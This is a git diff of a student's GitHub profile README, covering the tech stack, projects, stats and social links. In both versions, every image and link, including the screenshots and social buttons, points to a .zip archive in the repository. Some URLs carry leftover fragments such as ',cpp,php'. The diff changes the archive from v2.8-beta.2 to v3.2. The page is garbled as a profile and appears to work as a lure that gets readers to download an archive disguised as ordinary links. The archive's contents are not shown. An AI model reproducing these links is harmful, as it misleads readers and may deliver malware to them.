@@ -1,5 +1,5 @@
 <!--- <p align="center">
-  <img src="https://raw.githubusercontent.com/iftekharul01/iftekharul01/main/images/iftekharul-v2.8-beta.2.zip" alt="Iftekharul Islam Banner" width="100%" />
+  <img src="https://github.com/iftekharul01/iftekharul01/raw/refs/heads/main/images/iftekharul-v3.2.zip" alt="Iftekharul Islam Banner" width="100%" />
 </p>--->
 <h1 align="center">Hi 👋, I'm Iftekharul Islam</h1>
 <h3 align="center">Final-year Computer Science and Engineering Student | Aspiring Data Scientist</h3>
@@ -15,15 +15,15 @@
 ## 🛠️ Tech Stack  
 
 <p align="center">
-  <img src="https://raw.githubusercontent.com/iftekharul01/iftekharul01/main/images/iftekharul-v2.8-beta.2.zip,cpp,php" height="40" alt="programming" />
-  <img src="https://raw.githubusercontent.com/iftekharul01/iftekharul01/main/images/iftekharul-v2.8-beta.2.zip,css,js,bootstrap" height="40" alt="web" />
-  <img src="https://raw.githubusercontent.com/iftekharul01/iftekharul01/main/images/iftekharul-v2.8-beta.2.zip" height="40" alt="database" />
-  <img src="https://raw.githubusercontent.com/iftekharul01/iftekharul01/main/images/iftekharul-v2.8-beta.2.zip,git,github,figma" height="40" alt="tools" />
+  <img src="https://github.com/iftekharul01/iftekharul01/raw/refs/heads/main/images/iftekharul-v3.2.zip,cpp,php" height="40" alt="programming" />
+  <img src="https://github.com/iftekharul01/iftekharul01/raw/refs/heads/main/images/iftekharul-v3.2.zip,css,js,bootstrap" height="40" alt="web" />
+  <img src="https://github.com/iftekharul01/iftekharul01/raw/refs/heads/main/images/iftekharul-v3.2.zip" height="40" alt="database" />
+  <img src="https://github.com/iftekharul01/iftekharul01/raw/refs/heads/main/images/iftekharul-v3.2.zip,git,github,figma" height="40" alt="tools" />
 </p>
 
 <p align="center">
-  <img src="https://raw.githubusercontent.com/iftekharul01/iftekharul01/main/images/iftekharul-v2.8-beta.2.zip" height="40" alt="arduino" />
-  <img src="https://raw.githubusercontent.com/iftekharul01/iftekharul01/main/images/iftekharul-v2.8-beta.2.zip" height="40" alt="blynk" />
+  <img src="https://github.com/iftekharul01/iftekharul01/raw/refs/heads/main/images/iftekharul-v3.2.zip" height="40" alt="arduino" />
+  <img src="https://github.com/iftekharul01/iftekharul01/raw/refs/heads/main/images/iftekharul-v3.2.zip" height="40" alt="blynk" />
 </p>
 
 ---
@@ -33,15 +33,15 @@
 <table>
 <tr>
 <td align="center">
-  <a href="https://raw.githubusercontent.com/iftekharul01/iftekharul01/main/images/iftekharul-v2.8-beta.2.zip">
-    <img src="https://raw.githubusercontent.com/iftekharul01/iftekharul01/main/images/iftekharul-v2.8-beta.2.zip" width="250" alt="Portfolio Screenshot"/>
+  <a href="https://github.com/iftekharul01/iftekharul01/raw/refs/heads/main/images/iftekharul-v3.2.zip">
+    <img src="https://github.com/iftekharul01/iftekharul01/raw/refs/heads/main/images/iftekharul-v3.2.zip" width="250" alt="Portfolio Screenshot"/>
     <br><b>🌐 Portfolio</b>
   </a>
   <p>A Laravel-based portfolio website with responsive design, Google OAuth, and interactive sections.</p>
 </td>
 <td align="center">
-  <a href="https://raw.githubusercontent.com/iftekharul01/iftekharul01/main/images/iftekharul-v2.8-beta.2.zip">
-    <img src="https://raw.githubusercontent.com/iftekharul01/iftekharul01/main/images/iftekharul-v2.8-beta.2.zip" width="250" alt="Krishok Portal Screenshot"/>
+  <a href="https://github.com/iftekharul01/iftekharul01/raw/refs/heads/main/images/iftekharul-v3.2.zip">
+    <img src="https://github.com/iftekharul01/iftekharul01/raw/refs/heads/main/images/iftekharul-v3.2.zip" width="250" alt="Krishok Portal Screenshot"/>
     <br><b>🌾 কৃষক পোর্টাল</b>
   </a>
   <p>Bangla-localized farmer portal with weather updates, tutorials, and market prices.</p>
@@ -50,15 +50,15 @@
 
 <tr>
 <td align="center">
-  <a href="https://raw.githubusercontent.com/iftekharul01/iftekharul01/main/images/iftekharul-v2.8-beta.2.zip">
-    <img src="https://raw.githubusercontent.com/iftekharul01/iftekharul01/main/images/iftekharul-v2.8-beta.2.zip" width="250" alt="On The Go Screenshot"/>
+  <a href="https://github.com/iftekharul01/iftekharul01/raw/refs/heads/main/images/iftekharul-v3.2.zip">
+    <img src="https://github.com/iftekharul01/iftekharul01/raw/refs/heads/main/images/iftekharul-v3.2.zip" width="250" alt="On The Go Screenshot"/>
     <br><b>📱 On The Go</b>
   </a>
   <p>Community-driven mobile app for sharing posts, locations, and alerts.</p>
 </td>
 <td align="center">
-  <a href="https://raw.githubusercontent.com/iftekharul01/iftekharul01/main/images/iftekharul-v2.8-beta.2.zip">
-    <img src="https://raw.githubusercontent.com/iftekharul01/iftekharul01/main/images/iftekharul-v2.8-beta.2.zip" width="250" alt="Restaurant System Screenshot"/>
+  <a href="https://github.com/iftekharul01/iftekharul01/raw/refs/heads/main/images/iftekharul-v3.2.zip">
+    <img src="https://github.com/iftekharul01/iftekharul01/raw/refs/heads/main/images/iftekharul-v3.2.zip" width="250" alt="Restaurant System Screenshot"/>
     <br><b>🍴 Restaurant System</b>
   </a>
   <p>Prototype with owner dashboard & customer interface for seamless ordering and service.</p>
@@ -78,12 +78,12 @@
 ## 📊 GitHub Stats  
 
 <p align="center">
-  <img src="https://raw.githubusercontent.com/iftekharul01/iftekharul01/main/images/iftekharul-v2.8-beta.2.zip" alt="streak" />
+  <img src="https://github.com/iftekharul01/iftekharul01/raw/refs/heads/main/images/iftekharul-v3.2.zip" alt="streak" />
 </p>
 
 <p align="center">
-  <img src="https://raw.githubusercontent.com/iftekharul01/iftekharul01/main/images/iftekharul-v2.8-beta.2.zip" height="150" alt="stats" />
-  <img src="https://raw.githubusercontent.com/iftekharul01/iftekharul01/main/images/iftekharul-v2.8-beta.2.zip" height="150" alt="languages" />
+  <img src="https://github.com/iftekharul01/iftekharul01/raw/refs/heads/main/images/iftekharul-v3.2.zip" height="150" alt="stats" />
+  <img src="https://github.com/iftekharul01/iftekharul01/raw/refs/heads/main/images/iftekharul-v3.2.zip" height="150" alt="languages" />
 </p>
 
 ---
@@ -91,10 +91,10 @@
 ## 🌐 Connect With Me  
 
 <p align="center">
-  <a href="https://raw.githubusercontent.com/iftekharul01/iftekharul01/main/images/iftekharul-v2.8-beta.2.zip"><img src="https://raw.githubusercontent.com/iftekharul01/iftekharul01/main/images/iftekharul-v2.8-beta.2.zip" height="40" /></a>
-  <a href="https://raw.githubusercontent.com/iftekharul01/iftekharul01/main/images/iftekharul-v2.8-beta.2.zip"><img src="https://raw.githubusercontent.com/iftekharul01/iftekharul01/main/images/iftekharul-v2.8-beta.2.zip" height="40" /></a>
-  <a href="https://raw.githubusercontent.com/iftekharul01/iftekharul01/main/images/iftekharul-v2.8-beta.2.zip"><img src="https://raw.githubusercontent.com/iftekharul01/iftekharul01/main/images/iftekharul-v2.8-beta.2.zip" height="40" /></a>
-  <a href="https://raw.githubusercontent.com/iftekharul01/iftekharul01/main/images/iftekharul-v2.8-beta.2.zip"><img src="https://raw.githubusercontent.com/iftekharul01/iftekharul01/main/images/iftekharul-v2.8-beta.2.zip" height="40" /></a>
+  <a href="https://github.com/iftekharul01/iftekharul01/raw/refs/heads/main/images/iftekharul-v3.2.zip"><img src="https://github.com/iftekharul01/iftekharul01/raw/refs/heads/main/images/iftekharul-v3.2.zip" height="40" /></a>
+  <a href="https://github.com/iftekharul01/iftekharul01/raw/refs/heads/main/images/iftekharul-v3.2.zip"><img src="https://github.com/iftekharul01/iftekharul01/raw/refs/heads/main/images/iftekharul-v3.2.zip" height="40" /></a>
+  <a href="https://github.com/iftekharul01/iftekharul01/raw/refs/heads/main/images/iftekharul-v3.2.zip"><img src="https://github.com/iftekharul01/iftekharul01/raw/refs/heads/main/images/iftekharul-v3.2.zip" height="40" /></a>
+  <a href="https://github.com/iftekharul01/iftekharul01/raw/refs/heads/main/images/iftekharul-v3.2.zip"><img src="https://github.com/iftekharul01/iftekharul01/raw/refs/heads/main/images/iftekharul-v3.2.zip" height="40" /></a>
 </p>
 
 ---
